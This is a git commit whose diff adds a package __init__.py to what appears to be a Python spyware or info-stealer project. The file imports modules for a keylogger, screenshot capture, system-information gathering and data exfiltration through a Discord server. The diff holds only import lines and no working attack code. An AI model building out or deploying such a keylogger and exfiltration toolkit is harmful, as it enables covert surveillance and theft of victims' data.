7bb213994049b9bfe674c6a96389eb6d8c3c84ba
EONRaider <livewire_voodoo@protonmail.com>
2021-11-17 08:43:12 -0300

    Add __init__.py

---
+++ src/modules/__init__.py
@@ -0,0 +1,7 @@
+from src.modules.exfiltration.exfiltration_module import ExfiltrationModule
+from src.modules.exploitation.exploitation_module import ExploitationModule
+
+from src.modules.exfiltration.discord_server import Discord
+from src.modules.exploitation.keylogger import KeyLogger
+from src.modules.exploitation.system_information import SystemInformation
+from src.modules.exploitation.screenshot import ScreenShot
